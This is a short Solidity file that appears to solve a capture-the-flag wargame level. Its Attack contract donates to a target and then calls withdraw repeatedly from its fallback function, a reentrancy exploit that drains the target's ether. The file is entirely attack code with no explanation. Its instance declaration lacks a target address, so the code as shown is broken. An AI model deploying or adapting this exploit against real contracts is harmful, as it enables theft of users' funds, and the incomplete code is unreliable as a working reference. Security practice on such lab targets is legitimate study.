// SPDX-License-Identifier: MIT
pragma solidity^0.8.13;

interface Instance {
    
    function donate(address) external payable;
    function withdraw(uint) external;
}

contract Attack {
    
    Instance instance = Instance();

    function attack() public payable {

    instance.donate{value: msg.value}(address(this));
    instance.withdraw(1000000000000000);
    }

    fallback() external payable {
        
    instance.withdraw(1000000000000000);
    }

}